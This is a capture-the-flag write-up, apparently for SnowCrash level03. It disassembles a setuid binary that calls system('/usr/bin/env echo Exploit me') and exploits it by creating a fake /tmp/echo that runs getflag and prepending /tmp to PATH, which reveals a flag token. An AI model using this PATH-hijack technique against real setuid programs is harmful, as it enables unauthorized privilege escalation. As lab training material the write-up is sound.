## LEVEL 03

---

For this level we have in the `level03` repository a file named `level03`. This file is a ELF44 file. The first thing I do is `cat` this file to have so useful informations.

```shell
$ hexdump -C level03
[...]
000005e0  2f 75 73 72 2f 62 69 6e  2f 65 6e 76 20 65 63 68  |/usr/bin/env ech|
000005f0  6f 20 45 78 70 6c 6f 69  74 20 6d 65 00 00 00 00  |o Exploit me....|
[...]
00001020  00 00 00 00 47 43 43 3a  20 28 55 62 75 6e 74 75  |....GCC: (Ubuntu|
[...]
000012f0  5f 5f 75 69 64 5f 74 00  65 6e 76 70 00 2f 68 6f  |__uid_t.envp./ho|
00001300  6d 65 2f 75 73 65 72 2f  6c 65 76 65 6c 30 33 2f  |me/user/level03/|
00001310  6c 65 76 65 6c 30 33 2e  63 00 6c 6f 6e 67 20 6c  |level03.c.long l|
[...]
```

We hame few more informations now :
1. This file calls echo to print "Exploit Me".
2. This file has been compiled by GCC.
3. The source file was `/home/user/level03/level03.c`

Sadly our user doesn't have access to the source file.

I need to have for information about what `leve03` does for that I will use `gdb` which is a debugger and reverse engineering tool.

```shell
$ gdb -q level03
Reading symbols from /home/user/level03/level03...done.
(gdb) disas main
Dump of assembler code for function main:
   0x080484a4 <+0>:	 push   %ebp
   0x080484a5 <+1>:	 mov    %esp,%ebp
   0x080484a7 <+3>:	 and    $0xfffffff0,%esp
   0x080484aa <+6>:	 sub    $0x20,%esp
   0x080484ad <+9>:	 call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>: mov    %eax,0x18(%esp)
   0x080484b6 <+18>: call   0x8048390 <geteuid@plt>
   0x080484bb <+23>: mov    %eax,0x1c(%esp)
   0x080484bf <+27>: mov    0x18(%esp),%eax
   0x080484c3 <+31>: mov    %eax,0x8(%esp)
   0x080484c7 <+35>: mov    0x18(%esp),%eax
   0x080484cb <+39>: mov    %eax,0x4(%esp)
   0x080484cf <+43>: mov    0x18(%esp),%eax
   0x080484d3 <+47>: mov    %eax,(%esp)
   0x080484d6 <+50>: call   0x80483e0 <setresgid@plt>
   0x080484db <+55>: mov    0x1c(%esp),%eax
   0x080484df <+59>: mov    %eax,0x8(%esp)
   0x080484e3 <+63>: mov    0x1c(%esp),%eax
   0x080484e7 <+67>: mov    %eax,0x4(%esp)
   0x080484eb <+71>: mov    0x1c(%esp),%eax
   0x080484ef <+75>: mov    %eax,(%esp)
   0x080484f2 <+78>: call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>: movl   $0x80485e0,(%esp)
   0x080484fe <+90>: call   0x80483b0 <system@plt>
   0x08048503 <+95>: leave
   0x08048504 <+96>: ret
(gdb) x/s 0x80485e0
0x80485e0:	 "/usr/bin/env echo Exploit me"
```

Now I know that the program must have a line like this: `system("/usr/bin/env echo Exploit me")`

One more detail I found is that `level03` has `flag03` rights. So I need to change the line above to run the `getflag` command.

This command has a vulnerability because echo isn't called with a absolute path, so we can easily run the command we want with symlink and a PATH variable changed.

First I search the getflag executable path.
```shell
$ level03@SnowCrash:/tmp$ find / -name "*getflag*" 2>/dev/null
/bin/getflag
/rofs/bin/getflag
```

Then I create a file to execute getflag and give full rights to the file.
```shell
$ vim /tmp/echo
#!/bin/bash
/bin/getflag
$ chmod 777 /tmp/echo
```

And finally I change the PATH by adding the tmp path at the beginning and I run the command.
```shell
$ export PATH="/tmp:$PATH"
$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

